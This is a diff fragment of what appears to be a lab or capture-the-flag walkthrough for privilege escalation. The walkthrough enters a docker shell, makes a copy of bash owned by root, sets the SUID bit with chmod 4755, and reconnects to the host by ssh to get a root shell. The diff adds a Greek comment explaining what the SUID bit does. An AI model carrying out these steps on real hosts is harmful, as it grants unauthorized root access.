@@ -15,7 +15,7 @@ then you will exit
 4) exit
 and get in docker shell again. Now if you ls -al you will see the bash file.
 5) chown root:root bash
-6) chmod 4755 bash
+6) chmod 4755 bash               (Το SUID flag (4 στο 4755) σημαίνει ότι όταν οποιοσδήποτε χρήστης εκτελέσει αυτό το αρχείο, θα τρέξει με τα δικαιώματα του ιδιοκτήτη του αρχείου (δηλαδή του root))
 7) ls -al bash
 now you have a bash with root priv's
 8) connect to host again: ssh john@IP
